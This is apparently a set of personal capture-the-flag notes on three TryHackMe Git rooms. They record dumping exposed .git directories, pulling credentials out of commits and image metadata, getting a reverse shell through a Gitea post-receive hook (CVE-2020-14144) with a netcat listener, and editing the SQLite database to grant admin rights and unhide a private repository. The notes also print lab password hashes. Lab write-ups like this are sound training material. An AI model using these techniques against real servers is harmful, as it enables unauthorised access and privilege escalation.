# Git

## TryHackMe

### Git Happens

* Opened website in a browser
* DotGit extension automatically identified .git extension
  * view-source:http://10.10.60.56/.git/config
  * Downloaded all the files found in the .git folder
* Unzipped files and navigated into the directory containing the .git folder
* Viewed the git logs
  * `git log`
  * `git log --pretty=oneline`
* Viewed the specific commits in the logs
  * `git show <COMMIT ID>`
  * `git show e56eaa8e29b589976f33d76bc58a0c4dfb9315b1`
* Found cleartext credentials to login where the password was also the flag

```javascript
-      function login() {
-        let form = document.getElementById("login-form");
-        console.log(form.elements);
-        let username = form.elements["username"].value;
-        let password = form.elements["password"].value;
-        if (
-          username === "admin" &&
-          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
-        ) {
-          document.cookie = "login=1";
-          window.location.href = "/dashboard.html";
-        } else {
-          document.getElementById("error").innerHTML =
-            "INVALID USERNAME OR PASSWORD!";
-        }
-      }
```

### Git and Crumpets

Used `curl` against the host on port 80 which showed us a 301 permanent redirect

`curl -v http://10.10.135.79`

The output also mentioned setting up repos at git.git-and-crumpets.thm as adding that to the /etc/hosts file

Opened git.git-and-crumpets.thm in a browser.

Registered for an account.

Viewed publicly available repos and their commits.

Found message for commit `9a151a065797e3ae8e4d86da9d32d032cdec6885` that the user mentioned "I kept the password in my avatar to be more secure."

Downloaded the avatar.

`wget http://git.git-and-crumpets.thm/avatars/3fc2cde6ac97e8c8a0c8b202e527d56d`

Used exiftool to get information out of the .png file and found a potential password.

```bash
exiftool 3fc2cde6ac97e8c8a0c8b202e527d56d.png 
...
Description    : My 'Password' should be easy enough to guess
```

Logged into the Gitea UI as the scones user: `scones:Password`

Now I can modify the Settings for the repository scones/cant-touch-this

#### Exploitation (CVE-2020-14144)

I can modify the Git Hooks be placing in a reverse shell into the post-receive hook.

Started a nectat listener: `sudo nc -lvnp 443`

Modified README.md, committed the changes, and got a reverse shell as the git user.

The database data is located in `/var/lib/gitea/data`

We can change the permissions for the scones user to access the root repository or change the root repository permissions to be public.

#### Change the Scones user permissions

```sql
sqlite3 gitea.db
select * from user;
1|hydra|hydra||hydragyrum@example.com|0|enabled|9b020d3e158bc31b5fe64d668d94cab38cadc6721a5fdf7a4b1fb7bf97021c5e68f56bd9bd44d5ce9547e5e234086342c4e4|pbkdf2|0|0|0||0|||XGySX7uBlc|3C4NzJWN9e|en-US||1618386984|1621615239|1621614217|0|-1|1|1|0|0|0|0|0|d91f03c868d38ecf84ab3cc54f876106|hydragyrum@example.com|1|0|0|0|1|0|0|0|0|unified|arc-green|0
2|root|root|groot|root@example.com|0|enabled|2181d2b5fbf1859db426bcb94d97851d9a0e87a5eb47c5edc7f92bffc45b679e554c8367084f379e59936b68c0d770823ec9|pbkdf2|0|0|0||0|||2VK8fSxvIZ|5e5xPrzvBr|en-US||1618391049|1621716065|1621716065|1|-1|1|0|1|0|0|0|0|b2b218891f86ea980812a5b934ecec1a|root@examle.com|1|0|0|0|1|0|0|0|0|unified|gitea|0
3|scones|scones||withcream@example.com|0|enabled|8d0386b217e0f1ad5a1012d879ce93c9d77fd79d888410fdee9e76ec58d6fa017042906dd9a2ea498d3fd5a7486a73875660|pbkdf2|0|0|0||0|Her Majesty's Secret Service||IF60pw0rVc|13y4Vtc2AH|en-US|I like scones.|1618492621|1625292211|1625292211|0|-1|1|0|0|1|0|0|0|3fc2cde6ac97e8c8a0c8b202e527d56d|jackel@example.com|1|0|0|0|1|0|0|0|0|unified|gitea|0
4|test|test||test@test.thm|0|enabled|d3463d9c205751364af7850bca7956d0f5cc0eb125a097db54fd0087eec31cec1912245e57fdfc53423a89e6684a15f8939a|pbkdf2|0|0|0||0|||oe4oKzc3mk|EgtShiimON|en-US||1618526457|1618526530|1618526457|0|-1|1|0|0|0|0|0|0|15c9bc2cfbc7b7fd0b627422d8189173|test@test.thm|0|0|0|0|0|0|0|0|0|unified|gitea|0
5|user101|user101||test@mail.com|0|enabled|7233dc67184372521c3e39c824016db859d608025ad5a731f1dbed0d399753c17de21921618a385804ddc6bc57893049d555|pbkdf2|0|0|0||0|||BFMsu8xkcI|mameP7va9K|en-US||1625291416|1625291644|1625291416|0|-1|1|0|0|0|0|0|0|97dfebf4098c0f5c16bca61e2b76c373|test@mail.com|0|0|0|0|0|0|0|0|0|unified|gitea|0

UPDATE user SET is_admin=1 WHERE id=3;
```

#### Change the root repository permissions

```sql
sqlite3 gitea.db
SELECT * FROM repository;
1|1|hydra|hello-world|hello-world|Hello World||0||master|1|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|23159|1|0|null|0||1618390571|1618491347
2|2|root|backup|backup|||0||master|1|0|0|0|0|0|0|0|0|0|0|1|0|0|0|0|0|0|0|0|25612|1|0|null|0||1618493101|1618494415
3|3|scones|cant-touch-this|cant-touch-this|Stop! Hammer time!||0||master|1|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|23712|1|0|null|0||1618494644|1618496989
SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name='repository';
CREATE TABLE `repository` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `owner_id` INTEGER NULL, `owner_name` TEXT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `description` TEXT NULL, `website` TEXT NULL, `original_service_type` INTEGER NULL, `original_url` TEXT NULL, `default_branch` TEXT NULL, `num_watches` INTEGER NULL, `num_stars` INTEGER NULL, `num_forks` INTEGER NULL, `num_issues` INTEGER NULL, `num_closed_issues` INTEGER NULL, `num_pulls` INTEGER NULL, `num_closed_pulls` INTEGER NULL, `num_milestones` INTEGER DEFAULT 0 NOT NULL, `num_closed_milestones` INTEGER DEFAULT 0 NOT NULL, `num_projects` INTEGER DEFAULT 0 NOT NULL, `num_closed_projects` INTEGER DEFAULT 0 NOT NULL, `is_private` INTEGER NULL, `is_empty` INTEGER NULL, `is_archived` INTEGER NULL, `is_mirror` INTEGER NULL, `status` INTEGER DEFAULT 0 NOT NULL, `is_fork` INTEGER DEFAULT 0 NOT NULL, `fork_id` INTEGER NULL, `is_template` INTEGER DEFAULT 0 NOT NULL, `template_id` INTEGER NULL, `size` INTEGER DEFAULT 0 NOT NULL, `is_fsck_enabled` INTEGER DEFAULT 1 NOT NULL, `close_issues_via_commit_in_any_branch` INTEGER DEFAULT 0 NOT NULL, `topics` TEXT NULL, `trust_model` INTEGER NULL, `avatar` TEXT NULL, `created_unix` INTEGER NULL, `updated_unix` INTEGER NULL)

UPDATE repository SET is_private=0 WHERE id=2;
SELECT * FROM repository;
1|1|hydra|hello-world|hello-world|Hello World||0||master|1|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|23159|1|0|null|0||1618390571|1618491347
2|2|root|backup|backup|||0||master|1|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|25612|1|0|null|0||1618493101|1618494415
3|3|scones|cant-touch-this|cant-touch-this|Stop! Hammer time!||0||master|1|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|0|24715|1|0|null|0||1618494644|1618702858
```

Back in the Gitea UI we now have access to the root / backup git repository

Switching Branch to dotfiles we find a SSH Private Key and the file it is in is the name of the passphrase for logging in via SSH with the private key.

### harder

* After finding the subdomain pwd.harder.local and then navigating to it in a browser, the DotGit extension automatically identified .git extension.
* Downloaded all the files found in the .git folder
* Unzipped files and navigated into the directory containing the .git folder
* Viewed the git logs
  * `git log`
  * `git log --pretty=oneline`

Viewed the specific commits in the logs

```bash
kali@kali:~/ctf/thm/harder/pwd_harder_local$ git log --pretty=oneline
9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -> master) add gitignore
047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161 add extra security
ad68cc6e2a786c4e671a6a00d6f7066dc1a49fc3 added index.php
```

We see some interesting information the the commit "add extra security"

```bash
git show 047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
# We find some interesting files: auth.php, hmac.php, secret.php, and credentials .php
```

Also used a script from [GitTools ](https://github.com/internetwache/GitTools)to dump all the files from Git.

```bash
/opt/GitTools/Dumper/gitdumper.sh http://pwd.harder.local/.git/ .
```

When running `git status` we see 4 files that were deleted that look interesting.

We can get these files back again using GitTools

```bash
/opt/GitTools/Extractor/extractor.sh ~/ctf/thm/harder/pwd_harder_local/git/ extracted/
```

### Other...

## References

{% embed url="https://git-scm.com/docs" %}
